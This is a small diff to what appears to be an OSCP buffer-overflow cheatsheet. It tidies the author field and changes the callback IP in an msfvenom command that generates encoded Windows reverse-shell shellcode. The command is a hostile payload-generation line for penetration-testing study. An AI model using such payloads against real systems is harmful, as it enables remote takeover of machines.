@@ -1,6 +1,6 @@
 ---
 title: Buffer Overflow
-author: sKyW1per 
+author: sKyW1per
 category: "OSCP"
 date: "2021-03-30 00:01"
 tags: [OSCP, Cheatsheet]
@@ -60,5 +60,5 @@ jmp eax = FFE0
 
 ###### Create Shellcode for an unstaged reverse shell
 ```
-$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e x86/shikata_ga_nai -b “\x00\” > shellcode.txt
+$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.1 LPORT=443 -f c -e x86/shikata_ga_nai -b “\x00\” > shellcode.txt
 ```
